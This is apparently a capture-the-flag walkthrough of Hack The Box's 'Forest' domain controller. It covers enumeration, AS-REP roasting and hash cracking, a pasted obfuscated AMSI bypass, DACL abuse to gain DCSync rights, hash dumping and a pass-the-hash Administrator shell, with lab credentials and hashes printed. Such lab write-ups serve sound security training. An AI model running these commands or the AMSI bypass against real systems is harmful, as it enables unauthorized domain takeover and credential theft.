---
title: 'Forest Walkthrough: Exploiting AS-REP Roasting and Misconfigured AD Permissions
  to Compromise the Domain Controller.'
date: 2024-11-10 15:00:00 +0530
categories:
- Capture the Flags
- Windows
tags:
- HTB
- ldap
- on-prem
- privesc
- asrep
description: Walkthrough of HTB's Forest machine
---
## Recon

To begin the reconnaissance phase, a full port scan was conducted using Nmap to identify open TCP ports on the target. The scan was optimized for speed and aimed at discovering all ports:

### Explanation of Key Arguments

- **`T5`**: Maximizes scan speed. Using the highest timing template (`T5`) may cause Nmap to skip ports that don't respond quickly; consider using `T4` for more reliability, especially on networks with variable latency.
- **`sS`**: Conducts a SYN scan, initiating a TCP handshake without completing it for stealthiness, often evading firewalls that don't log incomplete handshakes.
- **`n`**: Disables DNS resolution, reducing scan time by preventing Nmap from making DNS queries.
- **`Pn`**: Skips host discovery, assuming the host is online, which is useful when you already know the target is up.
- **`p-`**: Scans all 65535 ports, covering every possible TCP port.

```bash
sudo nmap -T5 -sS -n -Pn --disable-arp-ping -p- 10.10.10.161 --max-retries 0
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-04 09:37 EST
Warning: 10.10.10.161 giving up on port because retransmission cap hit (0).
Nmap scan report for 10.10.10.161
Host is up (0.054s latency).
Not shown: 39910 closed tcp ports (reset), 25609 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
9389/tcp  open  adws
47001/tcp open  winrm
49666/tcp open  unknown
49667/tcp open  unknown
49686/tcp open  unknown
49708/tcp open  unknown
49980/tcp open  unknown
```

> **Note**: `--max-retries 0` is used to avoid any retries, which can speed up the scan but may miss some open ports on slower networks.

**Output**:
The scan identified several open ports, including those related to domain and directory services like Kerberos, LDAP, and RPC, suggesting this machine may function as a domain controller.

Followed by a UDP scan:

```bash
sudo nmap -vvv -sU -T4 -Pn --top-ports 1000 10.10.10.161 
PORT      STATE         SERVICE        REASON
53/udp    open          domain         udp-response ttl 127
88/udp    open          kerberos-sec   udp-response ttl 127
123/udp   open          ntp            udp-response ttl 127
389/udp   open          ldap           udp-response ttl 127
```

UDP services like DNS, Kerberos, and LDAP are discovered, with `--top-ports 1000` optimizing the scan to focus on the most common UDP ports.

### Aggressive Nmap Scan for Service and OS Detection

To gather additional information, we perform an aggressive scan. This includes OS detection, service version detection, and script scanning for potential vulnerabilities:

```bash
sudo nmap -T5 -A -n -Pn --disable-arp-ping -p 53,88,123,135,139,445,464,593,636,3268,9389,47001,49666,49667,49686,49709,49980 10.10.10.161
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-05 01:36 EST
Nmap scan report for 10.10.10.161
Host is up (0.13s latency).

PORT      STATE  SERVICE      VERSION
53/tcp    open   domain       Simple DNS Plus
88/tcp    open   kerberos-sec Microsoft Windows Kerberos (server time: 2024-11-05 06:30:42Z)
123/tcp   closed ntp
135/tcp   open   msrpc        Microsoft Windows RPC
139/tcp   open   netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open   microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open   kpasswd5?
593/tcp   open   ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open   tcpwrapped
3268/tcp  open   ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
9389/tcp  open   mc-nmf       .NET Message Framing
47001/tcp open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49666/tcp open   msrpc        Microsoft Windows RPC
49667/tcp open   msrpc        Microsoft Windows RPC
49686/tcp open   msrpc        Microsoft Windows RPC
49709/tcp closed unknown
49980/tcp open   msrpc        Microsoft Windows RPC
Aggressive OS guesses: Microsoft Windows Server 2016 (95%), Microsoft Windows Server 2016 build 10586 - 14393 (93%), Microsoft Windows Vista SP1 - SP2, Windows Server 2008 SP2, or Windows 7 (93%), Microsoft Windows Server 2012 R2 (93%), Microsoft Windows Server 2012 or Server 2012 R2 (91%), Microsoft Windows 10 (91%), Microsoft Windows 10 1507 (91%), Microsoft Windows 10 1507 - 1607 (91%), Microsoft Windows 10 1511 (91%), Microsoft Windows Server 2012 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h34m09s, deviation: 4h37m10s, median: -5m52s
| smb2-time: 
|   date: 2024-11-05T06:31:37
|_  start_date: 2024-11-03T15:43:07
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2024-11-04T22:31:40-08:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

```

**Key Findings**:

- **Domain Controller**: The host name `FOREST` and the domain `htb.local` indicate a possible Active Directory Domain Controller.
- **Service Details**: Ports like Kerberos (88/tcp), LDAP (3268/tcp), and Microsoft RPC suggest this machine hosts critical AD services.


### DNS Enumeration

Using `dig`, a DNS query is conducted to retrieve various DNS records. The `ANY` record type requests all available DNS entries the server is willing to disclose:

```bash
dig any htb.local @10.10.10.161

; <<>> DiG 9.20.2-1-Debian <<>> any htb.local @10.10.10.161
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 10128
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 2

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
; COOKIE: 691ad19d3f5f4344 (echoed)
;; QUESTION SECTION:
;htb.local.                     IN      ANY

;; ANSWER SECTION:
htb.local.              600     IN      A       10.10.10.161
htb.local.              3600    IN      NS      forest.htb.local.
htb.local.              3600    IN      SOA     forest.htb.local. hostmaster.htb.local. 108 900 600 86400 3600

;; ADDITIONAL SECTION:
forest.htb.local.       3600    IN      A       10.10.10.161

;; Query time: 151 msec
;; SERVER: 10.10.10.161#53(10.10.10.161) (TCP)
;; WHEN: Tue Nov 05 02:03:47 EST 2024
;; MSG SIZE  rcvd: 150
```

  - The DNS response reveals that `htb.local` resolves to `10.10.10.161`.
  - `NS` and `SOA` records further confirm the server setup, with `forest.htb.local` designated as the authoritative name server.


### SMB Enumeration

```bash
smbclient -N -L //10.10.10.161/
```

Anonymous login is successful:

```plaintext
        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.161 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Trying with another tool, `nxc`, reveals some additional details:

```bash
nxc smb 10.10.10.161 -u guest -p '' --shares
```

Output indicates Windows Server 2016 and shows SMBv1 enabled, but access is denied for the guest user:

```plaintext
SMB 10.10.10.161 445 FOREST [-] htb.local\guest: STATUS_ACCOUNT_DISABLED 
```

**Note**: Anonymous login may grant partial access to services, even though the Guest account is disabled.

### RPC Over SMB

> 💡 **RPC over SMB** allows querying Windows services and AD data, enabling functions like **SAMR** for user and group data retrieval. This can be useful for enumerating accounts and permissions in an environment with restricted SMB access.

Since anonymous login is enabled on SMB, leveraged `rpcclient` to enumerate users.

```bash
rpcclient -U "" -N 10.10.10.161 
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
user:[darkorithm] rid:[0x2581]
user:[abc] rid:[0x2582]
```

The command successfully enumerated domain users, revealing some standard and service accounts.

### LDAP Enumeration

Since LDAP ports (389/636) were open, I attempted domain enumeration using LDAP null binding (authentication without credentials). 

```bash
ldapsearch -x -H ldap://10.10.10.161 -b "DC=htb,DC=local" "(objectClass=user)" sAMAccountName | grep sAMAccountName:

sAMAccountName: Guest
sAMAccountName: DefaultAccount
sAMAccountName: FOREST$
sAMAccountName: EXCH01$
sAMAccountName: $331000-VK4ADACQNUCA
sAMAccountName: SM_2c8eef0a09b545acb
sAMAccountName: SM_ca8c2ed5bdab4dc9b
sAMAccountName: SM_75a538d3025e4db9a
sAMAccountName: SM_681f53d4942840e18
sAMAccountName: SM_1b41c9286325456bb
sAMAccountName: SM_9b69f1b9d2cc45549
sAMAccountName: SM_7c96b981967141ebb
sAMAccountName: SM_c75ee099d0a64c91b
sAMAccountName: SM_1ffab36a2f5f479cb
sAMAccountName: HealthMailboxc3d7722
sAMAccountName: HealthMailboxfc9daad
sAMAccountName: HealthMailboxc0a90c9
sAMAccountName: HealthMailbox670628e
sAMAccountName: HealthMailbox968e74d
sAMAccountName: HealthMailbox6ded678
sAMAccountName: HealthMailbox83d6781
sAMAccountName: HealthMailboxfd87238
sAMAccountName: HealthMailboxb01ac64
sAMAccountName: HealthMailbox7108a4e
sAMAccountName: HealthMailbox0659cc1
sAMAccountName: sebastien
sAMAccountName: lucinda
sAMAccountName: andy
sAMAccountName: mark
sAMAccountName: santi
sAMAccountName: darkorithm
sAMAccountName: abc
```

This search reveals several `sAMAccountName` entries, including some interesting user accounts like **svc-alfresco**,**sebastien**, **lucinda**, **andy**, **mark**, **santi**, and **abc** which may be viable for further enumeration.

### Checking for Users with Kerberos Pre-Auth Disabled

Kerberos Pre-Auth prevents attackers from requesting a TGT without proving knowledge of the user’s password. If Pre-Auth is disabled, attackers can potentially request TGTs for valid usernames and perform offline cracking (AS-REP roasting) to recover the password.

Normal Kerberos Authentication flow

- **AS-REQ**: Alice requests authentication by sending an encrypted timestamp.
- **AS-REP**: The KDC sends Alice a TGT and session key.
- **TGS-REQ**: Alice requests a service ticket for a specific resource.
- **TGS-REP**: The KDC issues a Service Ticket for the target service.
- **AP-REQ**: Alice presents the Service Ticket to the service.
- **AP-REP**: The service authenticates Alice and grants access.

To check for accounts with Pre-Auth disabled, use the `GetNPUsers.py` script:

```bash
python3 /home/kali/Red_Team/HTB/impacket/examples/GetNPUsers.py htb.local/ -dc-ip 10.10.10.161 -no-pass -usersfile user.txt -request 
```

This command identifies that only the **svc-alfresco** account has Pre-Auth disabled, allowing retrieval of its TGT hash for offline cracking.

```plaintext
$krb5asrep$23$svc-alfresco@HTB.LOCAL:1f0ac5bcd89b2a86c04ddff61bb8fa2c...
```

### Summary of External Recon

The reconnaissance reveals the following key points for potential attack vectors:

- **SMB and RPC**: Limited enumeration possible via anonymous access; SMBv1 is enabled.
- **LDAP**: Successful retrieval of user accounts, which could help with targeted attacks.
- **Kerberos Pre-Auth Disabled Account**: The `svc-alfresco` account has Pre-Auth disabled, making it susceptible to AS-REP Roasting for potential password recovery.

## Exploitation Phase - 1

After obtaining the AS-REP hash, attempt to crack it using **Hashcat** with mode 18200, which is specifically designed for Kerberos AS-REP hashes. Here, I used the popular **rockyou.txt** wordlist to brute-force the password:

```bash
hashcat -m 18200 -a 0 ./tgt.txt /usr/share/wordlists/rockyou.txt
```

The hash is successfully cracked, revealing the credentials `svc-alfresco:s3rvice`.

### Gaining Access with Evil-WinRM

Using the cracked credentials, logged into the machine with **Evil-WinRM** to gain an interactive PowerShell session:

```bash
evil-winrm -i 10.10.10.161 -u "svc-alfresco" -p "s3rvice"
```

![image.png]({ '/assets/img/Forest/image%202.png' | relative_url })

After connecting, navigating to the **Desktop** directory reveals the flag file. Submitting this flag completes the initial challenge.

### Local Privilege Escalation with PowerUp

To investigate potential privilege escalation paths, I uploaded **PowerUp.ps1**, a PowerShell script that helps enumerate misconfigurations and privilege escalation vectors. Executing **Invoke-AllChecks** runs a comprehensive scan:

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> . .\PowerUp.ps1
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> Invoke-AllChecks
```

Unfortunately, this scan does not reveal any promising privilege escalation opportunities.

### Defense Evasion with AMSI Bypass

Since we have a restricted shell and cannot disable Windows Defender directly, I ran an **AMSI bypass** script to evade AMSI detection. This bypass disables AMSI (Anti-Malware Scan Interface), which may allowed me to execute restricted scripts without interference:

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco> S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

This AMSI bypass may allow additional enumeration or exploitation attempts by running previously blocked PowerShell commands.


## Domain Recon

### Enumerating User Privileges
To understand the permissions and groups of the current user, I used the whoami /all command in PowerShell. This command output reveals that svc-alfresco is a member of three significant groups:

- Account Operators - Can create, modify, and delete user accounts, manage group memberships, and reset passwords.
- Privileged IT Accounts - Likely has elevated privileges within the organization.
- Service Accounts - Used for services running on the machine.
This combination of group memberships indicates the user may have substantial access within the domain, especially with Account Operators, which can manage user accounts within the domain.

![image.png]({ '/assets/img/Forest/image.png' | relative_url })

### Active Directory Enumeration with BloodHound
Using bloodhound-python to gather and visualize AD structure and relationships remotely, I ran the following command:

```bash
bloodhound-python -d htb.local -u svc-alfresco -p s3rvice -gc forest.htb.local -c all -ns 10.10.10.161
INFO: Found AD domain: htb.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: FOREST.htb.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: FOREST.htb.local
INFO: Found 34 users
INFO: Found 76 groups
INFO: Found 2 gpos
INFO: Found 15 ous
INFO: Found 20 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: EXCH01.htb.local
INFO: Querying computer: FOREST.htb.local
INFO: Done in 00M 49S

```
The command enumerates users, groups, and ACLs in the domain, providing insight into the AD structure.
![image.png]({ '/assets/img/Forest/image%201.png' | relative_url })
**Key Findings:** The Account Operators group has GenericAll rights over the Exchange Windows Permissions group, which, in turn, has WriteDACL permissions on the domain object HTB.LOCAL. This escalation path can potentially allow privilege elevation by modifying the DACL on the domain object.

## Privilege Escalation
Given the GenericAll rights on Exchange Windows Permissions, I used the following steps to escalate privileges:
1. **Creating a New User and Adding to Privileged Groups**:
   Since **Account Operators** have rights to create and modify users, I created a new user **binary_exec** and added it to **Exchange Windows Permissions** and **Remote Management Users** groups:

   ```bash
   *Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> net user binary_exec Pass123! /add /domain
   *Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> net group "Exchange Windows Permissions" binary_exec /add
   *Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> net localgroup "Remote Management Users" binary_exec /add
   ```
2. **Confirming Privilege Escalation**:
   Added **binary_exec** to **Remote Management Users** to enable remote login capabilities like WinRM.
![image.png]({ '/assets/img/Forest/image%202.png' | relative_url })

### Modifying DACL for DCSync Privileges

With the **WriteDACL** permission on the domain object **HTB.LOCAL**, I used PowerView commands to grant **DCSync** rights to **binary_exec**. DCSync allows an account to replicate credentials from a Domain Controller, enabling password hash extraction.

1. **Uploading PowerView to the Target**:
   Using **evil-winrm** to upload **PowerView.ps1**.

   ```bash
   *Evil-WinRM* PS C:\Users\binary_exec\Documents> upload /home/kali/Red_Team/Tools/PowerView.ps1
   ```
   ![image.png]({ '/assets/img/Forest/image%203.png' | relative_url })
2. **Executing PowerView to Modify ACL**:
   Two PowerShell commands were used to modify the ACL:
```bash
*Evil-WinRM* PS C:\Users\binary_exec\Documents> Add-ObjectACL -PrincipalIdentity binary_exec -Credential Pass123! -Rights DCSync
```
Since `-Credential` expects a **PSCredential** object, I updated the command with the correct format:
```bash
$pass = ConvertTo-SecureString 'Pass123!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('htb\binary_exec', $pass)
Add-ObjectACL -PrincipalIdentity binary_exec -Credential $cred -Rights DCSync
```

## Dumping NTLM Hashes Using secretsdump.py

With DCSync rights enabled, I used **secretsdump.py** from Impacket to extract NTLM hashes directly from the Domain Controller:

```bash
python3 /home/kali/Red_Team/Tools/impacket/examples/secretsdump.py htb/binary_exec@10.10.10.161
```

This output provided NTLM hashes for domain accounts, including the **Administrator** account.


## Gaining Administrator Shell

With the extracted NTLM hash for the Administrator account, I used **psexec.py** to gain a shell as Administrator:

```bash
python3 /home/kali/Red_Team/Tools/impacket/examples/psexec.py administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
```
![image.png]({ '/assets/img/Forest/image%204.png' | relative_url })

This provided an Administrator shell, completing the privilege escalation process.

![image.png]({ '/assets/img/Forest/image%205.png' | relative_url })

## Disclaimer:

*The techniques and tools discussed in this walkthrough are intended solely for educational purposes and to help improve cybersecurity awareness. Please conduct any penetration testing activities only on systems that you own or have explicit permission to test. Unauthorized access to computer systems is illegal and punishable by law. The author does not take responsibility for any misuse of the information provided*
